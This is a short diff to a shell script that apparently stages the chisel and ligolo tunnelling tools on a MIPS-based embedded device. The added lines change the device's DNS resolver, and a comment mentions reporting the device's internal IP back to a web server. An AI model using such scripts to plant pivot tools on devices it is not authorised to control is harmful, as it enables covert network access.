@@ -2,6 +2,8 @@
 
 ##### BEGIN CONFIG #####
 
+DNS='1.1.1.1'
+
 FILEPATH=srv
 OUT_PATH=/usr/local/bin
 CHISEL_BIN=mipsel-bin/chisel-mipsel
@@ -15,6 +17,14 @@ XXD_OUT_BIN=xxd
 LIGOLO_OUT_BIN=ligolo
 
 ##### END CONFIG #####
+
+# Add DNS to resolv.conf
+if [ -f /etc/resolv.conf ] && [ -z "$(grep -i '1.1.1.1' /etc/resolv.conf)" ] ; then
+    if [ -f /usr/sbin/mergeresolv.sh ] ; then
+        echo "nameserver ${DNS}" >> /etc/resolv.conf.def
+        /usr/sbin/mergeresolv.sh
+    fi
+fi
 
 if [[ "${3}" -eq 1 ]]; then
     # Report back internal IP address of device in hex to internal web server
